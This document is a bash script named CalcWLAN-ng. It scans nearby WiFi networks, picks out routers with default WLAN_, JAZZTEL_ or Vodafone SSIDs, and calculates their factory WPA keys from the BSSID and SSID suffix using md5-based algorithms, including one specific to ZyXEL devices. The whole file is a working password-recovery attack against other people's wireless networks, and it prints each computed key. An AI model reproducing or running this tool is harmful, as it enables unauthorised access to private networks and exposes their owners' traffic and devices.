#!/bin/bash 
# version 0.4 - added ZyXEL P660HW-B1A support (BSSID 00:1f:a4)
# version 0.3 - added recursive scan
# version 0.2 - added VodafoneXXXX support
# version 0.1 - initial revision
echo "[] CalcWLAN-ng (original source by a.s.r, improved by pof)"
if [ -z $1 ]; then
	echo "Usage: $0 <interface>"
	echo "Example: $0 wlan0"
	exit 1
fi
if [ $(whoami) != "root" ]; then
	echo "You must be root to scan networks."
	exit 1
fi
echo "Scanning wifi networks on interface $1, hit ^C to stop"
DONE=""
while : ; do
	echo -n "."
	TMP=$(tempfile)
	iwlist $1 scan > $TMP
	SSIDLIST=`cat $TMP |egrep "ESSID:\"((WLAN|JAZZTEL)_|Vodafone)(\w){4}" |cut -f 2 -d \"`
	if [ ! -z "$SSIDLIST" ]; then
		for SSID in $SSIDLIST; do
			echo "$DONE" |grep -w "$SSID" >/dev/null
			if [ $? != 0 ]; then
				MAC=$(cat $TMP |grep -B6 "$SSID" |grep "Address:" |awk '{print $5}' |head -n 1)
				echo $MAC |grep -i "^00:1F:A4:" >/dev/null
				if [ $? == 0 ]; then
					HEAD=$(echo -n "$SSID" |tr 'A-Z' 'a-z' |rev |cut -c -4 |rev)
					BSSIDP=$(echo -n "$MAC" |tr 'A-Z' 'a-z' |tr -d : |cut -c -8)
					KEY=$(echo -n "${BSSIDP}${HEAD}" |md5sum |tr 'a-z' 'A-Z' |cut -c -20)
				else
					HEAD=$(echo -n "$SSID" |sed -e "s/WLAN_//" -e "s/JAZZTEL_//" -e "s/Vodafone//" |tr 'a-z' 'A-Z')
					BSSID=$(echo -n "$MAC" |tr 'a-z' 'A-Z' |tr -d :)
					BSSIDP=$(echo -n "$BSSID" |cut -c-8)
					KEY=$(echo -n bcgbghgg$BSSIDP$HEAD$BSSID |md5sum |cut -c-20)
				fi
				printf "\nSSID: $SSID   \tKEY: $KEY\n"
				DONE="${SSID} ${DONE}"
			fi
		done
	fi
	rm $TMP
done
